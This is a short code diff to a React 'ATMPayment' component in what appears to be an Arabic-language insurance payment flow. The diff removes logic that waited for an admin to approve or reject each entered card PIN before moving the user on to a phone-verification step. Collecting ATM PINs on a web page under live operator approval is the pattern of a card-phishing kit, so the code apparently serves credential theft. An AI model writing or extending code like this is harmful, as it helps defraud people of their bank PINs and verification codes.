@@ -26,27 +26,8 @@ const ATMPayment = () => {
 
   const [pin, setPin] = useState("");
   const [loading, setLoading] = useState(false);
-  const [waitingApproval, setWaitingApproval] = useState(false);
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(orderId !== "DEMO-001" ? orderId : null);
   const inputRef = useRef<HTMLInputElement>(null);
-
-  const approvalStatus = useAdminApproval(currentOrderId, "atm");
-
-  useEffect(() => { inputRef.current?.focus(); }, []);
-
-  useEffect(() => {
-    if (approvalStatus === "approved" && currentOrderId) {
-      toast.success("تم التحقق بنجاح");
-      sessionStorage.setItem("insurance_order_id", currentOrderId);
-      navigate("/insurance/phone-verify", { state: { offer, orderId: currentOrderId } });
-    } else if (approvalStatus === "rejected") {
-      toast.error("تم رفض العملية");
-      setWaitingApproval(false);
-      setLoading(false);
-      setPin("");
-      inputRef.current?.focus();
-    }
-  }, [approvalStatus, currentOrderId, navigate, offer]);
 
   const handleVerify = async () => {
     if (pin.length < 4) return;
